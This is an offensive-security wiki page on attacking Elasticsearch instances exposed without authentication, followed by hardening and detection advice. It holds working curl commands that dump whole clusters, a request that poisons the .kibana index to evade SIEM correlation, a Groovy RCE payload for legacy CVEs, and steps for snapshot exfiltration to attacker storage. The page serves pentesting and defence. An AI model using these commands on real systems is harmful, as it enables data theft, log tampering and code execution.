---
title: Exposed ElasticSearch
slug: elasticsearch-exposed
---

> **TL;DR:** Port 9200 open without auth → full _search and _cluster access; sometimes index-write for persistence.

## What it is
Elasticsearch ships with no authentication on the open-source flavours below 8.x and on misconfigured X-Pack deployments. An exposed HTTP API (default 9200/tcp) lets anyone enumerate indices, read every document, dump the cluster, and in many cases write new indices, snapshot to attacker-controlled storage, or trigger RCE via scripting.

## Preconditions / where it applies
- `network.host` bound to `0.0.0.0` / public interface
- `xpack.security.enabled: false` (default on OSS < 8.0)
- Or auth misconfigured (`anonymous` role with broad cluster privileges)
- Reachable port 9200/9300; sometimes 5601 (Kibana) co-exposed

## Technique
1. Fingerprint:
   ```bash
   curl -s http://target:9200/
   curl -s http://target:9200/_cluster/health
   curl -s http://target:9200/_cat/indices?v
   ```
   A JSON banner with `version`, `cluster_name`, `tagline` is unauth confirmation.
2. **Bulk dump**:
   ```bash
   curl -s "http://target:9200/_search?size=10000&pretty"
   curl -s "http://target:9200/<index>/_search?scroll=2m&size=1000"
   ```
   Pivot scroll IDs to page through millions of docs.
3. **Sensitive index discovery** — look for `.kibana`, `logstash-*`, `filebeat-*`, app-specific names; grep dumps for `password`, `token`, `secret`, `aws_`, `Bearer`.
4. **Write / persistence** — if writes permitted, index attacker docs, modify dashboards (`.kibana`), poison logs (defeating SIEM correlation):
   ```bash
   curl -XPOST http://target:9200/.kibana/_doc -H 'Content-Type: application/json' \
        -d '{"type":"config","config":{"defaultIndex":"poisoned"}}'
   ```
5. **CVE-2014-3120 / CVE-2015-1427** — dynamic scripting (Groovy/MVEL) RCE on legacy ES (< 1.4.3 / < 1.3.8):
   ```json
   {"script": {"lang":"groovy","inline":"java.lang.Runtime.getRuntime().exec('id')"}}
   ```
6. **Snapshot exfil** — register an attacker S3/FS repo, snapshot whole cluster, download.
7. **Kibana pivot** — open Kibana on 5601, use Dev Tools console; or [[ssrf]] from Kibana's reporting plugin to internal services.

## Detection and defence
- Upgrade to 8.x with `xpack.security.enabled: true` (default since 8.0); enable TLS on the transport and HTTP layers.
- Bind to loopback or internal-only interfaces; gate behind VPN/SG; never 0.0.0.0 on public hosts.
- Disable dynamic scripting on old versions; remove anonymous role.
- Audit with `_security/role` / `_security/user`; alert on `_search` spikes from unknown IPs.
- Shodan/Censys monitor your ASN for `product:elastic` on 9200.
- Related: [[mongodb-exposed]], [[ssrf]], [[information-disclosure]].

## References
- [Elastic — securing your cluster](https://www.elastic.co/guide/en/elasticsearch/reference/current/secure-cluster.html) — official hardening
- [HackTricks — 9200 Elasticsearch](https://book.hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html) — enumeration recipes
- [Elastic — CVE-2015-1427 advisory](https://www.elastic.co/community/security) — Groovy scripting RCE
